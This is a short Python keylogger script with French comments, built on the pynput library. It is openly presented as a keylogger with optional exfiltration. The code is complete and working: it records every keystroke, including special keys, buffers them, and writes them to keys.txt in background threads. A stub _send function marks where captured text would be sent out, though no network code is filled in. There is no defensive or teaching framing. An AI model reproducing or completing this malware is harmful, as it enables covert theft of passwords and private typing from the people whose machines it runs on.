# Keylogger pynput — log fichier + exfil optionnel
# deps: pynput requests
from pynput import keyboard
from pathlib import Path
import threading, time

LOG  = Path("keys.txt")
FLUSH_N = 50
_buf: list[str] = []
_lock = threading.Lock()

def _send(t): pass

def _flush():
    with _lock:
        if not _buf: return
        chunk = "".join(_buf); _buf.clear()
    with LOG.open("a", encoding="utf-8") as f: f.write(chunk)
    _send(chunk)

def on_press(key):
    try: ch = key.char or ""
    except AttributeError: ch = f"[{key.name}]"
    with _lock:
        _buf.append(ch)
        if len(_buf) >= FLUSH_N:
            threading.Thread(target=_flush, daemon=True).start()

def _periodic():
    while True: time.sleep(10); _flush()

threading.Thread(target=_periodic, daemon=True).start()
with keyboard.Listener(on_press=on_press) as l: l.join()
    